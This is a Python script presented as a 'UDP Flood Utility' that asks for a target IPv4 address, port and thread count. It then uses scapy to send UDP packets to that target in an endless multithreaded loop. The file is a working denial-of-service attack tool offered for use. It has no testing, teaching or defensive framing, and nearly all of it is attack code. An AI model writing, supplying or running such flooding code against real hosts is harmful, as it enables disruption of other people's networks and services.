#!/usr/bin/env python3

from concurrent.futures import thread

try:
    from colorama import init, Fore, Back, Style
    from scapy.all import *
    import subprocess
    import threading
    import logging
    import math
    import time
    import sys
    import os
except Exception as e:
    print("[!] Library import error: %s " % e)

logging.basicConfig(format="%(message)s", level=logging.INFO)

init(convert=True)

class UDPPacket():        

    def __init__(self,target,port,thread_count):
        self.target           = target
        self.target_port      = port
        self.thread_count     = thread_count

    def SendUDPPacket(self):
        try:
            udpPkt   = sr1(IP(dst=self.target)/UDP(dport=int(self.target_port)),verbose=False)
            logging.info(Style.BRIGHT + Back.BLACK + Fore.GREEN  + "[*] Sent UDP Packet to -> %s:%s " % (self.target,self.target_port))
        except Exception as e:
            logging.info(Style.BRIGHT + Back.BLACK + Fore.RED    + "[!] Error: %s " % e)
            pass
        try:
            if(os.name == 'nt'):
                os.system('cls')
            else:
                os.system('clear')
        except:
            pass

    def ContinuousUDPFlood(self):
        current_threads = []
        try:
            while(True):
                for i in range(0,self.thread_count):
                    try:
                        t = threading.Thread(target=self.SendUDPPacket)
                        t.start()
                        current_threads.append(t)
                        for current_thread in current_threads:
                            current_thread.join()
                    except:
                        pass
        except KeyboardInterrupt:
            logging.info("[!] Interrupt received , departing")
            time.sleep(1)
            sys.exit(1)

def main():
    #
    try:
        if(os.name == 'nt'):
            os.system('cls')
        else:
            os.system('clear')
    except:
        pass
    #
    print(Style.BRIGHT + Back.BLACK + Fore.GREEN + """
UDP Flood Utility                       
    """)
    #
    target_address = input("[+] Enter the target IPV4 address-> ")
    target_port    = input("[+] Enter the target port-> ")
    thread_count   = int(input("[+] Enter the number of threads to allocate-> "))
    #
    time.sleep(3)
    #
    print(Style.BRIGHT + Back.RED + Fore.WHITE    + "[*] Starting UDP Flood ")
    time.sleep(1)
    #
    FloodInstance = UDPPacket(target_address,target_port,thread_count)
    FloodInstance.ContinuousUDPFlood()

if(__name__ == '__main__'):
    main()